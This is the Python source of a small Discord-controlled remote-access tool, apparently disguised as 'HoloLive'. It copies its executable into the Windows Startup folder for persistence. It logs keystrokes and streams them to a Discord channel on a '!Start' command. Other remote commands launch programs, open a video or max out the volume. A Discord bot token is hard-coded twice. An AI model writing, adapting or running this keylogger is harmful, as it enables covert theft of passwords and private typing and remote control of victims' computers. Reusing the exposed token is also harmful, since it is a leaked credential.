import keyboard
import discord
import os
import shutil
from selenium import webdriver
from time import sleep
import pyautogui

intents = discord.Intents.all()
client = discord.Client(intents=intents)
connect = False
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
try:
    shutil.copy('.\dist\HoloLive\HoloLive.exe', startup_folder)
except:
    pass
key = []

def on_key_press(event):
    print(f'Tecla pressionada: {event.name}')
    key.append(event.name)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
    connect = True

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!Start'):
        await message.channel.send('Bot iniciado!')
        keyboard.on_press(on_key_press)
        while True:
            await message.channel.send(f"{key}")
    elif message.content.startswith('!SpawnCalc'):
        os.system('calc')
        await message.channel.send('Calculadora executada!')
    elif message.content.startswith('!SpawnLuan'):
        driver = webdriver.Edge()
        driver.get('https://youtu.be/qjjT960FYt4?si=kDPc1Xii6wbQWgxJ')
        sleep(3)
        pyautogui.press('Space')
        await message.channel.send('LuanGamplays!!!!')
        sleep(15)
    elif message.content.startswith('!SpawnVolume'):
        for i in range(70):
            pyautogui.press('volumeup')
        await message.channel.send('Volume UP!')
        
while connect == False:
    try:
        client.run('MTA2NDYzOTQ4ODI4MzkxODM3Ng.GALGpQ.3l1ztVOcvtL_BfrAy6H7MyalmSOWbr3v5iCgB8')
    except:
        pass


#MTA2NDYzOTQ4ODI4MzkxODM3Ng.GALGpQ.3l1ztVOcvtL_BfrAy6H7MyalmSOWbr3v5iCgB8
